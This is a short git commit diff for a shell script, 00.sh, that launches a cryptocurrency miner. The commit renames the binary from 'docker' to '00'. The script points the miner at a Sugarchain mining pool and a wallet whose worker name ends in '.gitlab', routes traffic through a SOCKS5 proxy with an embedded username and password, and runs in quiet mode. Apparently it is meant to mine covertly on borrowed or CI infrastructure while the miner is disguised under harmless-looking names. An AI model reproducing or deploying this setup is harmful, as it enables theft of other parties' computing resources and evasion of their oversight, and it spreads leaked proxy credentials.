f5f1ee9142ab8c700559eaf5e3a7c1b6815d2594
03081997 <86400154+03081997@users.noreply.github.com>
2021-07-01 02:26:02 +0700

    Create 00.sh

--- 00.sh
+++ 00.sh
@@ -4,4 +4,4 @@ chmod +x docker limit.sh
 POOL=1pool.sugarchain.org:3333
 WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.gitlab
 PROXY=socks5://woiden_adz:212@sg-socks5.woiden.net:8080
-./docker -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
+./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
